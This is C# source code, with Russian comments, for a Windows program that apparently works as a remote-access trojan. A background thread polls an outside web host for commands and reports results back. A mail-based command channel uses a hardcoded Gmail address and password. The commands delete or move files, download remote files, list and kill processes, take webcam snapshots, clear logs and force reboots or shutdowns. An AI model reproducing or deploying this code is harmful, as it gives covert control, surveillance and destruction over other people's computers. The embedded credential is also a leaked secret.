using System;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using WinServerWinForms.Properties;
using MailKit;
using MailKit.Net.Imap;
using System.Net.Mail;

namespace WinServerWinForms
{
    public partial class Form1 : Form
    {
        Thread ThMail, ThHost;
        int MailThreadSleep = 100;

        public Form1()
        {
            InitializeComponent();
            Command.OnlineAdd();
            //ThMail = new Thread(StartThMail) { IsBackground = true };
            ThHost = new Thread(StartThHost) { IsBackground = true };
            //ThMail.Start();
            ThHost.Start();
            Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Сервер запущен\n";
            Settings.Default.Save();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Command.OnlineRemove();
            Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Сервер завершает работу\n";
            Settings.Default.Save();
        }

        private static string GET(string Url, string Data)
        {
            WebRequest req = WebRequest.Create(Url + "?" + Data);
            WebResponse resp = req.GetResponse();
            Stream stream = resp.GetResponseStream();
            StreamReader sr = new StreamReader(stream);
            string Out = sr.ReadToEnd();
            sr.Close();
            return Out;
        }

        private void StartThHost()
        {
            byte Code = 0; // Переменная для контроля выключения/перезагрузки системы и сервера

            while (true)
            {
                try
                {
                    string com = GET("http://winserver.mcdir.ru/command/check/", $"user={Environment.MachineName}");
                    
                    if (com == "IndexError")
                        continue; // Пропускаем если нет команд
                    
                    object[] obj = SelectCommand(com, Code); // Выполняем действия комманды и получаем ответ
                    Code = (byte)obj[1];
                    
                    GET("http://winserver.mcdir.ru/command/perform/", $"user={Environment.MachineName}&command={com}&result={obj[0]}");

                    if (Code != 0) // Управление выключением и перезагрузкой ОС
                    {
                        byte code = Code;
                        Code = 0;

                        switch (code)
                        {
                            case 1:
                                new Boot().Halt(true, false); // Мягкая перезагрузка
                                break;
                            case 2:
                                new Boot().Halt(true, true); // Жесткая перезагрузка
                                break;
                            case 3:
                                new Boot().Halt(false, false); // Мягкое выключение
                                break;
                            case 4:
                                new Boot().Halt(false, true); // Жесткое выключение
                                break;
                        }
                    }
                    // Задержка в цикле чтобы снизить нагрузку на процессор (без задержки 25% нагрузки постоянно, с ней 0-3% при условии 100мс)
                    Thread.Sleep(MailThreadSleep);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Ошибка сервера: " + ex.Message + "\n";
                    Settings.Default.Save();
                }
            }
        }

        private void StartThMail()
        {
            byte Code = 0; // Переменная для контроля выключения/перезагрузки системы и сервера

            using (ImapClient client = new ImapClient())
            {
                try
                {
                    client.Connect("imap.gmail.com", 993, true); // Подключение к почтовому серверу
                    client.Authenticate("fivesevenom@gmail.com", "health57"); // Аутентификация почты
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Ошибка сервера: " + ex.Message + "\n";
                    Settings.Default.Save();
                }

                IMailFolder inbox = client.Inbox; // Объект папки

                while (true)
                {
                    try
                    {
                        inbox.Open(FolderAccess.ReadWrite); // Открываем папку в режиме чтения и записи
                        if (inbox.Count == 0)
                            continue; // Пропускаем если нет сообщений
                        else
                        {
                            if (inbox.GetMessage(0).Subject != Environment.MachineName && inbox.GetMessage(0).HtmlBody == null)
                                continue; // Пропускаем если не совпало имя и текст сообщения пуст
                        }

                        // Извлекаем из текста письма комманду
                        string com = inbox.GetMessage(0).HtmlBody;
                        com = com.Substring(com.IndexOf("~") + 1);
                        com = com.Remove(com.IndexOf("~"));

                        // Удаляем прочитанное письмо
                        inbox.AddFlags(0, MessageFlags.Deleted, true);
                        inbox.Expunge();

                        object[] obj = SelectCommand(com, Code); // Выполняем действия комманды и получаем ответ
                        Code = (byte)obj[1];

                        MailAddress from = new MailAddress("fivesevenom@gmail.com", Environment.MachineName);  // Отправитель - адрес и отображаемое в письме имя
                        MailAddress to = new MailAddress("ottomayer57@yandex.ru"); // Кому отправляем

                        MailMessage m = new MailMessage(from, to) // Объект сообщения
                        {
                            Subject = "WinServer", // Тема письма
                            Body = $"<div>{obj[0]}</div>", // Текст письма
                            IsBodyHtml = true // Письмо представляет код html
                        };

                        SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587) // Адрес smtp-сервера и порт, с которого отправляется письмо
                        {
                            Credentials = new NetworkCredential("fivesevenom@gmail.com", "health57"), // логин и пароль
                            EnableSsl = true // Использование сертификата защиты SSL
                        };
                        smtp.Send(m); // Отправить сообщение

                        if (Code != 0) // Управление выключением и перезагрузкой ОС
                        {
                            byte code = Code;
                            Code = 0;

                            switch (code)
                            {
                                case 1:
                                    new Boot().Halt(true, false); // Мягкая перезагрузка
                                    break;
                                case 2:
                                    new Boot().Halt(true, true); // Жесткая перезагрузка
                                    break;
                                case 3:
                                    new Boot().Halt(false, false); // Мягкое выключение
                                    break;
                                case 4:
                                    new Boot().Halt(false, true); // Жесткое выключение
                                    break;
                            }
                        }
                        // Задержка в цикле чтобы снизить нагрузку на процессор (без задержки 25% нагрузки постоянно, с ней 0-3% при условии 100мс)
                        Thread.Sleep(MailThreadSleep);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        Settings.Default.Log += "\t" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + ": Ошибка сервера: " + ex.Message + "\n";
                        Settings.Default.Save();
                    }
                }
            }
        }

        private object[] SelectCommand(string com, byte Code)
        {
            string message = null; // Переменная для ответа клиенту
            string[] Com = { com.Substring(0, 1), null, null, null, null }; // Буффер для комманд

            switch (Com[0])
            {
                case "@":
                    try
                    {
                        // Разбиваем строку на команды
                        Com[1] = com.Substring(1, 1); // One command
                        Com[2] = com.Substring(2, 1); // Two command
                        if (!com.Contains("|"))
                            Com[3] = com.Substring(3); // One Path
                        else
                        {
                            int a = com.IndexOf("|", 3);
                            Com[3] = com.Substring(3, a - 3); // One Path
                            Com[4] = com.Substring(a + 1); // Two Path
                        }
                    }
                    catch (Exception ex) { message = "Error Com[@]: " + ex.Message; break; }

                    switch (Com[1])
                    {
                        case "D": // Directory
                            try
                            {
                                switch (Com[2])
                                {
                                    case "C": // Create
                                        Directory.CreateDirectory(Com[3]);
                                        message = string.Format("Директория по пути {0} создана", Com[3]);
                                        break;
                                    case "D": // Delete
                                        Directory.Delete(Com[3], true);
                                        message = string.Format("Директория по пути {0} удалена", Com[3]);
                                        break;
                                    case "M": // Move
                                        Directory.Move(Com[3], Com[4]);
                                        message = string.Format("Директория по пути {0} перемещена в {1}", Com[3], Com[4]);
                                        break;
                                }
                            }
                            catch (Exception ex) { message = "Error Directory: " + ex.Message; }
                            break;
                        case "F": // File
                            try
                            {
                                switch (Com[2])
                                {
                                    case "C": // Create
                                        using (FileStream stream = new FileStream(Com[3], FileMode.Create))
                                        {
                                            message = string.Format("Файл по пути {0} создан", Com[3]);
                                        }
                                        break;
                                    case "D": // Delete
                                        File.Delete(Com[3]);
                                        message = string.Format("Файл по пути {0} удален", Com[3]);
                                        break;
                                    case "M": // Move
                                        File.Move(Com[3], Com[4]);
                                        message = string.Format("Файл по пути {0} перемещен в {1}", Com[3], Com[4]);
                                        break;
                                    case "L": // Download
                                              //handler.SendFile(Com[3]);
                                        message = "Файл успешно отправлен";
                                        break;
                                    case "U": // Upload
                                        new WebClient().DownloadFile(Com[3], Path.GetTempPath() + Com[4]);
                                        message = "Файл успешно скачан в " + Path.GetTempPath() + Com[4];
                                        break;
                                }
                            }
                            catch (Exception ex) { message = "Error File: " + ex.Message; }
                            break;
                        case "U": // Universal
                            try
                            {
                                switch (Com[2])
                                {
                                    case "Z": // Zipping
                                        Zipping(Com[3]);
                                        message = string.Format("Папка по пути {0} архивированна в {1}", Com[3], Path.GetTempPath() + "DumpData.zip");
                                        break;
                                    case "U": // UnZipping
                                        UnZipping(Com[3], Com[4]);
                                        message = string.Format("Архив по пути {0} распакован в папку {1}", Com[3], Com[4]);
                                        break;
                                    case "P": // Port
                                        //int port = Settings.Default.Port;
                                        //Settings.Default.Port = Convert.ToInt32(Com[3]);
                                        //Settings.Default.Save();
                                        //message = string.Format("Текущий порт {0} был изменен на {1}", port, Com[3]);
                                        break;
                                }
                                break;
                            }
                            catch (Exception ex) { message = "Error Universal: " + ex.Message; }
                            break;
                    }
                    break;
                case "$":
                    try
                    {
                        // Разбиваем строку на команды
                        Com[1] = com.Substring(1, 1); // One command

                        if (com.Length > 2)
                            Com[2] = com.Substring(2); // One Path
                    }
                    catch (Exception ex) { message = "Error Com[$]: " + ex.Message; break; }

                    switch (Com[1])
                    {
                        case "C": // Catalogs
                            try
                            {
                                message = "$C";
                                if (Com[2] == null || Com[2] == "")
                                    foreach (string s in Directory.GetLogicalDrives())
                                        message += s + "|";
                                else
                                    foreach (string s in Directory.GetDirectories(Com[2]))
                                        message += s + "|";
                            }
                            catch (Exception ex) { message = "Error Catalogs: " + ex.Message; }
                            break;
                        case "F": // Files
                            try
                            {
                                message = "$F";
                                foreach (string s in Directory.GetFiles(Com[2]))
                                    message += s + "|";
                            }
                            catch (Exception ex) { message = "Error Files: " + ex.Message; }
                            break;
                        case "P": // Get List Process
                            try
                            {
                                message = "$P";
                                foreach (Process proc in Process.GetProcesses())
                                    message += proc.ProcessName + "|";
                            }
                            catch (Exception ex) { message = "Error GetListProcess: " + ex.Message; }
                            break;
                        case "K": // Kill Process
                            try
                            {
                                message = "$K";
                                CloseProcess(Com[2]);
                                message = string.Format("Процесс {0} закрыт", Com[2]);
                            }
                            catch (Exception ex) { message = "Error KillProcess: " + ex.Message; }
                            break;
                        case "W": // WebCam
                            try
                            {
                                message = "$W";
                                new WebCamSc();
                                //handler.SendFile(Path.GetTempPath() + "DumpMemory.tmpbdw");
                            }
                            catch (Exception ex) { message = "Error WebCam: " + ex.Message; }
                            break;
                        case "U": // KillCPU
                            try
                            {
                                message = "$U";
                                //CTS = new CancellationTokenSource();
                                //for (int i = 0; i < Environment.ProcessorCount; i++)
                                //new Thread(Function).Start(CTS.Token);

                                /*void Function(object obj)
                                {
                                    CancellationToken token = (CancellationToken)obj;
                                    while (!token.IsCancellationRequested) { }
                                }*/
                                message = "Нагрузка процессора включена";
                            }
                            catch (Exception ex) { message = "Error KillCPU: " + ex.Message; }
                            break;
                        case "I":
                            try
                            {
                                message = "$I";
                                //CTS.Cancel();
                                message = "Нагрузка процессора выключена";
                            }
                            catch (Exception ex) { message = "Error KillCPU: " + ex.Message; }
                            break;
                    }
                    break;
                default:
                    switch (com)
                    {
                        case "con": // Connect
                            message = "Сервер запущен. Ожидание подключений...";
                            break;
                        case "l": // Log
                            if (Settings.Default.Log == null)
                                message = "В лог файле отсутствуют записи";
                            else
                                message = "\n" + Settings.Default.Log;
                            break;
                        case "cl": // Clear Log
                            Settings.Default.Log = null;
                            Settings.Default.Save();
                            message = "Лог файл очищен";
                            break;
                        case "tmp": // Path Temp Folder
                            message = "Временная папка пользователя: " + Path.GetTempPath();
                            break;
                        case "sr": // System Reboot
                            message = "Выполняется перезагрузка ОС...";
                            Code = 1;
                            break;
                        case "sfr": // System Forced Reboot
                            message = "Выполняется принудительная перезагрузка ОС...";
                            Code = 2;
                            break;
                        case "se": // System Exit
                            message = "Выполняется выключение ОС...";
                            Code = 3;
                            break;
                        case "sfe": // System Forced Exit
                            message = "Выполняется принудительное выключение ОС...";
                            Code = 4;
                            break;
                        case "x": // Exit
                            Process.GetCurrentProcess().Kill();
                            break;
                        default:
                            message = "Команда не определена";
                            break;
                    }
                    break;
            }

            object[] obj = { message, Code };
            return obj;
        }

        private void Zipping(string path)
        {
            /*ZipFile zf = new ZipFile(Path.GetTempPath() + "DumpData.zip"); // КУДА МЫ БУДЕМ СОХРАНЯТЬ ГОТОВЫЙ АРХИВ
            zf.AddDirectory(path); // ЧТО МЫ БУДЕМ СЖИМАТЬ
            zf.Save();*/
        }

        private void UnZipping(string exFile, string exDir)
        {
            /*using (ZipFile zip = ZipFile.Read(exFile))
            {
                zip.ExtractAll(exDir, ExtractExistingFileAction.OverwriteSilently);
            }*/
        }

        private void CloseProcess(string name)
        {
            foreach (Process proc in Process.GetProcesses())
                if (proc.ProcessName.ToLower().Contains(name.ToLower()))
                    proc.Kill();
        }
    }

    class WebCamSc
    {
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        public static extern IntPtr CapCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        [DllImport("user32", EntryPoint = "SendMessage")]
        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

        public WebCamSc()
        {
            IntPtr hWndC = CapCreateCaptureWindowA("VFW Capture", unchecked((int)0x80000000) | 0x40000000, 0, 0, 320, 240, 0, 0); // Узнать дескриптор камеры
            SendMessage(hWndC, 0x40a, 0, 0); // Подключиться к камере
            SendMessage(hWndC, 0x419, 0, Marshal.StringToHGlobalAnsi(Path.GetTempPath() + "DumpMemory.tmpbdw").ToInt32()); // Сохранить скриншот
            SendMessage(hWndC, 0x40b, 0, 0); // Отключить камеру
        }
    }

    class Boot
    {
        // Импортируем API функцию InitiateSystemShutdown
        [DllImport("advapi32.dll", EntryPoint = "InitiateSystemShutdownEx")]
        static extern int InitiateSystemShutdown(string lpMachineName, string lpMessage, int dwTimeout, bool bForceAppsClosed, bool bRebootAfterShutdown);
        // Импортируем API функцию AdjustTokenPrivileges
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        // Импортируем API функцию GetCurrentProcess
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();
        // Импортируем API функцию OpenProcessToken
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        // Импортируем API функцию LookupPrivilegeValue
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        // Импортируем API функцию LockWorkStation
        [DllImport("user32.dll", EntryPoint = "LockWorkStation")]
        static extern bool LockWorkStation();
        // Объявляем структуру TokPriv1Luid для работы с привилегиями
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        // Объявляем необходимые, для API функций, константые значения, согласно MSDN
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

        private void SetPriv() // Функция SetPriv для повышения привилегий процесса
        {
            TokPriv1Luid tkp; // Экземпляр структуры TokPriv1Luid 
            IntPtr htok = IntPtr.Zero;

            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok)) // Открываем "интерфейс" доступа для своего процесса
            {
                // Заполняем поля структуры
                tkp.Count = 1;
                tkp.Attr = SE_PRIVILEGE_ENABLED;
                tkp.Luid = 0;
                LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tkp.Luid); // Получаем системный идентификатор необходимой нам привилегии
                AdjustTokenPrivileges(htok, false, ref tkp, 0, IntPtr.Zero, IntPtr.Zero); // Повышем привилигеию своему процессу
            }
        }

        public int Halt(bool RSh, bool Force) // Публичный метод для перезагрузки/выключения машины
        {
            SetPriv(); // Получаем привилегия
            return InitiateSystemShutdown(null, null, 0, Force, RSh); // Вызываем функцию InitiateSystemShutdown, передавая ей необходимые параметры
        }

        public int Lock() => LockWorkStation() ? 1 : 0; // Публичный метод для блокировки операционной системы
    }
}
